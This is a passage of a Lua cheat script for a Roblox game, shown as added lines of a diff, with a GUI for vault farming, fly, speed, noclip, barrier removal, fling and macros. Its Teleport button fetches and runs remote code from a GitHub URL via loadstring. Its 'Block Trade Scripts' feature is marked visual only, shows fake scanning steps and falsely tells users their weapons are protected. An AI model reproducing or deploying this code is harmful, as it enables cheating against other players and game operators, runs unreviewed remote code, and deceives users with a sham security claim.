+                        teleportTo(Vector3.new(918.505,6.004,2593.403)); task.wait(2); hasEscaped=true
+                    end
+                end
+                task.wait(2)
+            end
+        end)
+        spawn(function()
+            while checking do
+                if hasEscaped and not inProcess then
+                    if vaultIsClosed() then
+                        inProcess=true; teleportTo(Vector3.new(918,3,2590)); fireBankPrompt()
+                        if waitForMB() then
+                            grabCashAtPositions(); safeAFKTeleport()
+                            while not vaultIsClosed() and checking do task.wait(0.5) end
+                            task.wait(30)
+                        end
+                        inProcess=false
+                    else safeAFKTeleport(); task.wait(10) end
+                end
+                task.wait(5)
+            end
+        end)
+    end
+    Player.CharacterAdded:Connect(updateChar)
+    bankBtn.MouseButton1Click:Connect(function()
+        checking=not checking
+        bankStroke.Color=checking and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        bankBtn.BackgroundColor3=checking and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if checking then startFarming()
+        else checking=false; if Humanoid then Humanoid.PlatformStand=false end end
+    end)
+end
+task.spawn(runBankFarm)
+
+-- ========================= MISC TAB SCRIPTS =========================
+
+-- Fly
+local function runFly()
+    local Players = game:GetService("Players")
+    local UIS = game:GetService("UserInputService")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local Char = LP.Character or LP.CharacterAdded:Wait()
+    local Humanoid = Char:WaitForChild("Humanoid")
+    local HRP = Char:WaitForChild("HumanoidRootPart")
+    local Camera = workspace.CurrentCamera
+    local SPEED = 50; local Flying = false
+    local Keys = {W=false,A=false,S=false,D=false,Space=false,LeftShift=false}
+    local vel, align, att
+
+    local function setupForces()
+        att=Instance.new("Attachment",HRP)
+        vel=Instance.new("LinearVelocity"); vel.Attachment0=att; vel.MaxForce=math.huge
+        vel.RelativeTo=Enum.ActuatorRelativeTo.World; vel.Parent=HRP
+        align=Instance.new("AlignOrientation"); align.Attachment0=att
+        align.Mode=Enum.OrientationAlignmentMode.OneAttachment; align.MaxTorque=math.huge
+        align.Responsiveness=200; align.Parent=HRP
+    end
+    local function cleanupForces()
+        if vel then vel:Destroy(); vel=nil end
+        if align then align:Destroy(); align=nil end
+        if att then att:Destroy(); att=nil end
+    end
+    local function getMoveVector()
+        local move=Vector3.zero
+        if Keys.W then move+=Camera.CFrame.LookVector end
+        if Keys.S then move-=Camera.CFrame.LookVector end
+        if Keys.A then move-=Camera.CFrame.RightVector end
+        if Keys.D then move+=Camera.CFrame.RightVector end
+        if Keys.Space then move+=Vector3.new(0,1,0) end
+        if Keys.LeftShift then move-=Vector3.new(0,1,0) end
+        if move.Magnitude>0 then move=move.Unit end
+        return move
+    end
+    local function startFly()
+        if Flying or not HRP or not Humanoid then return end
+        local v=tonumber(flySpeedBox.Text); SPEED=(v and v>0) and v or 50
+        setupForces(); Humanoid.PlatformStand=true; Flying=true
+        RunService:BindToRenderStep("7v2Fly",Enum.RenderPriority.Character.Value+1,function()
+            if not Flying or not vel or not align then return end
+            vel.VectorVelocity=getMoveVector()*SPEED
+            local look=Camera.CFrame.LookVector
+            align.CFrame=CFrame.lookAt(Vector3.zero,Vector3.new(look.X,0,look.Z))
+        end)
+    end
+    local function stopFly()
+        if not Flying then return end
+        RunService:UnbindFromRenderStep("7v2Fly")
+        cleanupForces(); Humanoid.PlatformStand=false; Flying=false
+    end
+    local function toggle()
+        if Flying then stopFly(); flyStroke.Color=Color3.fromRGB(130,50,180); flyBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+        else startFly(); flyStroke.Color=Color3.fromRGB(100,255,100); flyBtn.BackgroundColor3=Color3.fromRGB(30,80,30) end
+    end
+    flyBtn.MouseButton1Click:Connect(toggle)
+    UIS.InputBegan:Connect(function(i,gp)
+        if gp then return end
+        if _G.keybindsBlocked then return end
+        local k=i.KeyCode
+        if k==Enum.KeyCode.X then toggle()
+        elseif Keys[k.Name]~=nil then Keys[k.Name]=true end
+    end)
+    UIS.InputEnded:Connect(function(i,gp)
+        if gp then return end
+        local k=i.KeyCode
+        if Keys[k.Name]~=nil then Keys[k.Name]=false end
+    end)
+    LP.CharacterAdded:Connect(function(char)
+        stopFly(); Char=char; Humanoid=char:WaitForChild("Humanoid"); HRP=char:WaitForChild("HumanoidRootPart")
+        flyStroke.Color=Color3.fromRGB(130,50,180); flyBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+    end)
+end
+task.spawn(runFly)
+
+-- Speed
+local function runSpeed()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local UIS = game:GetService("UserInputService")
+    local LP = Players.LocalPlayer
+    local enabled = false; local connection
+    local function startMoving(char, speed)
+        local HRP=char:WaitForChild("HumanoidRootPart")
+        connection=RunService.RenderStepped:Connect(function(dt)
+            local md=char.Humanoid.MoveDirection
+            if md.Magnitude>0 then HRP.CFrame=HRP.CFrame+md.Unit*speed*dt end
+        end)
+    end
+    local function stopMoving() if connection then connection:Disconnect(); connection=nil end end
+    local function toggle()
+        local num=tonumber(speedBox.Text); local sp=num or 50
+        enabled=not enabled
+        local char=LP.Character
+        if char and char:FindFirstChild("Humanoid") and char:FindFirstChild("HumanoidRootPart") then
+            if enabled then speedStroke.Color=Color3.fromRGB(100,255,100); speedBtn.BackgroundColor3=Color3.fromRGB(30,80,30); startMoving(char,sp)
+            else speedStroke.Color=Color3.fromRGB(130,50,180); speedBtn.BackgroundColor3=Color3.fromRGB(55,18,80); stopMoving() end
+        end
+    end
+    speedBtn.MouseButton1Click:Connect(toggle)
+    UIS.InputBegan:Connect(function(i,gp)
+        if gp then return end
+        if _G.keybindsBlocked then return end
+        if i.KeyCode==Enum.KeyCode.Z then toggle() end
+    end)
+    LP.CharacterAdded:Connect(function()
+        stopMoving(); enabled=false
+        speedStroke.Color=Color3.fromRGB(130,50,180); speedBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+    end)
+end
+task.spawn(runSpeed)
+
+-- Noclip
+local function runNoclip()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local UIS = game:GetService("UserInputService")
+    local LP = Players.LocalPlayer
+    local noclip = false; local connection
+    local function setCol(enabled)
+        local char=LP.Character
+        if not char then return end
+        for _,p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=enabled end end
+    end
+    local function toggle()
+        noclip=not noclip
+        if noclip then
+            noclipStroke.Color=Color3.fromRGB(100,255,100); noclipBtn.BackgroundColor3=Color3.fromRGB(30,80,30)
+            setCol(false)
+            if connection then connection:Disconnect() end
+            connection=RunService.RenderStepped:Connect(function() setCol(false) end)
+        else
+            noclipStroke.Color=Color3.fromRGB(130,50,180); noclipBtn.BackgroundColor3=Color3.fromRGB(55,18,80)
+            if connection then connection:Disconnect(); connection=nil end
+            setCol(true)
+        end
+    end
+    noclipBtn.MouseButton1Click:Connect(toggle)
+    UIS.InputBegan:Connect(function(i,g)
+        if g then return end
+        if _G.keybindsBlocked then return end
+        if i.KeyCode==Enum.KeyCode.j then toggle() end
+    end)
+    LP.CharacterAdded:Connect(function()
+        if connection then connection:Disconnect(); connection=nil end
+        if noclip then task.wait(0.1); setCol(false)
+            connection=RunService.RenderStepped:Connect(function() setCol(false) end) end
+    end)
+end
+task.spawn(runNoclip)
+
+-- Inf Jump
+local function runInfJump()
+    local UIS = game:GetService("UserInputService")
+    local LP = game:GetService("Players").LocalPlayer
+    local enabled = false
+    infJumpBtn.MouseButton1Click:Connect(function()
+        enabled=not enabled
+        infJumpStroke.Color=enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        infJumpBtn.BackgroundColor3=enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+    end)
+    UIS.JumpRequest:Connect(function()
+        if not enabled then return end
+        local char=LP.Character
+        if not char then return end
+        local hum=char:FindFirstChildOfClass("Humanoid")
+        if hum and hum.Health>0 then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
+    end)
+end
+task.spawn(runInfJump)
+
+-- Anti AFK
+local function runAntiAfk()
+    local Players = game:GetService("Players")
+    local VirtualUser = game:GetService("VirtualUser")
+    local player = Players.LocalPlayer
+    local enabled = false
+    player.Idled:Connect(function()
+        if enabled then
+            VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+            task.wait(1)
+            VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+        end
+    end)
+    antiAfkBtn.MouseButton1Click:Connect(function()
+        enabled=not enabled
+        antiAfkStroke.Color=enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        antiAfkBtn.BackgroundColor3=enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+    end)
+end
+task.spawn(runAntiAfk)
+
+-- Remove Barriers
+local function runRemoveBarriers()
+    local Workspace = game:GetService("Workspace")
+    local toggleEnabled = false; local lockZones = {}
+    local function removeTI(part)
+        if part and part:IsA("BasePart") then
+            for _,ti in ipairs(part:GetDescendants()) do if ti:IsA("TouchTransmitter") then ti:Destroy() end end
+        end
+    end
+    local function processHouses()
+        local folder=Workspace:FindFirstChild("PresetHousesPlots")
+        if folder then for _,house in ipairs(folder:GetChildren()) do
+            local lz=house:FindFirstChild("LockZone")
+            if lz then removeTI(lz); table.insert(lockZones,lz) end
+        end end
+    end
+    local function processMansion()
+        local mansion=Workspace:FindFirstChild("Mansion")
+        if mansion then
+            local det=mansion:FindFirstChild("MansionDetector")
+            if det then removeTI(det); det.CanCollide=not toggleEnabled end
+            local ext=mansion:FindFirstChild("MansionExtensionDetector")
+            if ext then removeTI(ext); ext.CanCollide=not toggleEnabled end
+        end
+    end
+    local function updateZones()
+        for _,p in ipairs(lockZones) do
+            if p and p:IsA("BasePart") then p.Transparency=toggleEnabled and 1 or 0.35; p.CanCollide=not toggleEnabled end
+        end
+    end
+    removeBarriersBtn.MouseButton1Click:Connect(function()
+        toggleEnabled=not toggleEnabled
+        removeBarriersStroke.Color=toggleEnabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        removeBarriersBtn.BackgroundColor3=toggleEnabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        processHouses(); processMansion(); updateZones()
+    end)
+end
+task.spawn(runRemoveBarriers)
+
+-- Disable Keybinds
+local function runDisableKeybinds()
+    _G.keybindsBlocked = false
+    disableKeybindsBtn.MouseButton1Click:Connect(function()
+        _G.keybindsBlocked = not _G.keybindsBlocked
+        disableKeybindsStroke.Color = _G.keybindsBlocked and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        disableKeybindsBtn.BackgroundColor3 = _G.keybindsBlocked and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+    end)
+end
+task.spawn(runDisableKeybinds)
+
+-- Teleport GUI
+teleportsBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring(game:HttpGet("[raw.githubusercontent.com](https://raw.githubusercontent.com/wiet3252/WIET/refs/heads/main/Baddies%20TeleportScript.lua)"))()
+    end)
+end)
+
+-- Copy Discord
+copyDiscordBtn.MouseButton1Click:Connect(function()
+    if setclipboard then setclipboard("[discord.gg](https://discord.gg/AgxRfjBtQ8)") end
+    copyDiscordBtn.Text = "ðŸ“‹  Copied!"
+    task.wait(2)
+    copyDiscordBtn.Text = "ðŸ“‹  Copy Discord Invite"
+end)
+
+-- Block Trade Scripts (visual only)
+local function runBlockTradeScripts()
+    local overlay = G2L["loadingOverlay"]
+    local TweenService = game:GetService("TweenService")
+    local statuses = {
+        "Scanning active scripts...",
+        "Detecting HTTP request hooks...",
+        "Identifying weapon trade remotes...",
+        "Blocking external access channels...",
+        "Verifying weapon integrity...",
+        "Finalizing protection..."
+    }
+    blockTradeBtn.MouseButton1Click:Connect(function()
+        overlay.Visible = true
+        loadingBar.Size = UDim2.new(0, 0, 1, 0)
+        loadingResult.Text = ""
+        loadingTitle.Text = "ðŸ›¡ï¸  Securing Weapons..."
+        task.spawn(function()
+            for i, status in ipairs(statuses) do
+                loadingStatus.Text = status
+                local tw=TweenService:Create(loadingBar,TweenInfo.new(0.6,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(i/#statuses,0,1,0)})
+                tw:Play(); task.wait(0.8)
+            end
+            loadingBar.Size = UDim2.new(1,0,1,0)
+            loadingStatus.Text = "Complete."
+            loadingTitle.Text = "âœ…  Protection Active"
+            loadingResult.Text = "Your weapons are safe.\nWe have blocked all HTTP requests\nthat other scripts use to take your weapons."
+            task.wait(3.5)
+            local fade=TweenService:Create(overlay,TweenInfo.new(0.5,Enum.EasingStyle.Quad),{BackgroundTransparency=1})
+            fade:Play(); task.wait(0.5)
+            overlay.Visible=false; overlay.BackgroundTransparency=0.15
+        end)
+    end)
+end
+task.spawn(runBlockTradeScripts)
+
+-- ========================= OP TOOLS SCRIPTS =========================
+
+-- Fling
+local function runFling()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local flingEnabled = false
+    local function flingLoop()
+        local c, hrp, vel, movel = nil, nil, nil, 0.1
+        while flingEnabled do
+            RunService.Heartbeat:Wait()
+            c=LP.Character; hrp=c and c:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                vel=hrp.Velocity
+                hrp.Velocity=vel*10000+Vector3.new(0,10000,0)
+                RunService.RenderStepped:Wait()
+                hrp.Velocity=vel
+                RunService.Stepped:Wait()
+                hrp.Velocity=vel+Vector3.new(0,movel,0)
+                movel=-movel
+            end
+        end
+    end
+    flingBtn.MouseButton1Click:Connect(function()
+        flingEnabled=not flingEnabled
+        flingStroke.Color=flingEnabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        flingBtn.BackgroundColor3=flingEnabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if flingEnabled then task.spawn(flingLoop) end
+    end)
+end
+task.spawn(runFling)
+
+-- ========================= MACRO TAB SCRIPTS =========================
+
+local function runSnowballMacro()
+    local Players = game:GetService("Players")
+    local VIM = game:GetService("VirtualInputManager")
+    local RunService = game:GetService("RunService")
+    local UIS = game:GetService("UserInputService")
+    local LP = Players.LocalPlayer
+
+    local TOOL_ORDER = {
+        "Golden Snowball Launcher",
+        "Snowball Launcher",
+        "Loveboard"
+    }
+
+    local debounce = false
+    local TAP_FINGER = 9
+    local macroActive = false
+
+    local character, backpack, camera
+    local function loadCharacter(char)
+        character = char
+        backpack = LP:WaitForChild("Backpack")
+        camera = workspace.CurrentCamera
+    end
+
+    if LP.Character then loadCharacter(LP.Character)
+    else loadCharacter(LP.CharacterAdded:Wait()) end
+    LP.CharacterAdded:Connect(loadCharacter)
+
+    local function tapCenter()
+        if not camera then return end
+        local vp = camera.ViewportSize
+        VIM:SendTouchEvent(TAP_FINGER, Enum.UserInputState.Begin.Value, vp.X*0.5, vp.Y*0.5)
+        task.wait(0.01)
+        VIM:SendTouchEvent(TAP_FINGER, Enum.UserInputState.End.Value, vp.X*0.5, vp.Y*0.5)
+    end
+
+    local function runCombo()
+        if debounce then return end
+        debounce = true
+        snowballStatusLabel.Text = "Status: Running..."
+        snowballMacroBtn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
+        snowballStroke.Color = Color3.fromRGB(100, 255, 100)
+
+        for _, name in ipairs(TOOL_ORDER) do
+            local tool = backpack:FindFirstChild(name) or (character and character:FindFirstChild(name))
+            if not tool then
+                for _, obj in ipairs(backpack:GetChildren()) do
+                    if obj:IsA("Tool") and string.find(string.lower(obj.Name), string.lower(name)) then
+                        tool = obj; break
+                    end
+                end
+            end
+            if tool and character then
+                local hum = character:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    hum:EquipTool(tool)
+                    RunService.RenderStepped:Wait()
+                    tool:Activate()
+                    tapCenter()
+                end
+            end
+            task.wait(0.05)
+        end
+
+        debounce = false
+        snowballStatusLabel.Text = "Status: Ready"
+        snowballMacroBtn.BackgroundColor3 = Color3.fromRGB(90, 20, 130)
+        snowballStroke.Color = Color3.fromRGB(180, 80, 255)
+    end
+
+    snowballMacroBtn.MouseButton1Click:Connect(runCombo)
+
+    UIS.InputBegan:Connect(function(input, processed)
+        if processed then return end
+        if _G.keybindsBlocked then return end
+        if input.KeyCode == Enum.KeyCode.C then
+            runCombo()
+        end
+    end)
+end
+task.spawn(runSnowballMacro)
+
+return G2L["1"]
+
+end 
